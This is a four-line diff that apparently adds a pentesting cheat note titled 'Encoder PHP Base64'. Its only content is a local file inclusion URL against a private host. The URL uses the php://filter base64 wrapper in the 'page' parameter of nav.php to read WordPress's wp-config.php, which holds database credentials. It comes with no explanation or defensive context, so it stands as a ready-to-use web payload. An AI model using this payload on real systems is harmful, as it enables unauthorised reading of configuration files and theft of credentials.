@@ -1,0 +1,4 @@
+==============================================================================
+[+] Encoder PHP Base64
+==============================================================================
+http://172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php
